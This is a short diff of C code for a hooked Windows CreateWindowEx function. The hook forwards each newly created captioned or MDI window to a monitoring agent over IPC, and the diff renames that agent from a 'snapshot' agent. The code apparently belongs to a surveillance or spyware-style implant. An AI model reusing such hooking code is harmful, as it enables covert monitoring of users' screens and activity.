@@ -24,9 +24,9 @@ HWND _stdcall H_CreateWindowExHook(void *data_param,
 	if (ret_code == NULL)
 		return ret_code;
 	
-	IF_ACTIVE_AGENT(PM_SNAPSHOTAGENT_IPC) {
+	IF_ACTIVE_AGENT(PM_ONNEWWINDOW_IPC) {
 		if ( (dwStyle&WS_CAPTION)==WS_CAPTION || (dwStyle&WS_EX_MDICHILD)==WS_EX_MDICHILD)
-			IPC_CLIENT_WRITE(PM_SNAPSHOTAGENT, (BYTE *)&ret_code, 4, dwStyle, IPC_DEF_PRIORITY);
+			IPC_CLIENT_WRITE(PM_ONNEWWINDOW_IPC, (BYTE *)&ret_code, 4, dwStyle, IPC_DEF_PRIORITY);
 	}
 	return ret_code;
 }
